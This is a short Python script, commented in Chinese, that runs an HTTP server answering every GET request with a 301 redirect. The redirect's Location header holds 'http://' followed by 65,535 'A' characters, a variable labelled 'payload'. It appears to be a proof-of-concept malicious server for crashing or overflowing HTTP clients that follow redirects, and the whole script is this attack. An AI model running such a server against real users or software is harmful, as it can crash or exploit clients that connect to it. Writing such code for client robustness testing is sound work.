# 導入必要的模組
from http.server import BaseHTTPRequestHandler, HTTPServer
import argparse
import logging

# 初始化日誌記錄
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 定義處理HTTP請求的類
class MyServer(BaseHTTPRequestHandler):
    # GET請求處理方法
    def do_GET(self):
        # 設置重定向狀態碼和Location頭部
        self.send_response(301)
        payload = "A" * 65535
        self.send_header('Location', f'http://{payload}')
        self.end_headers()

# 定義服務器的主函數
def run(server_class=HTTPServer, handler_class=MyServer, port=8080, debug=False):
    # 設置服務器地址和端口
    server_address = ('', port)
    # 創建服務器實例
    httpd = server_class(server_address, handler_class)
    if debug:
        logger.setLevel(logging.DEBUG)
    print(f'Starting server on port {port}...')
    try:
        # 啟動服務器
        httpd.serve_forever()
    except KeyboardInterrupt:
        # 在終端上捕獲鍵盤中斷信號，並停止服務器
        print('Shutting down server...')
        httpd.server_close()

# 啟動服務器
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="HTTP Server")
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    args = parser.parse_args()
    run(debug=args.debug)
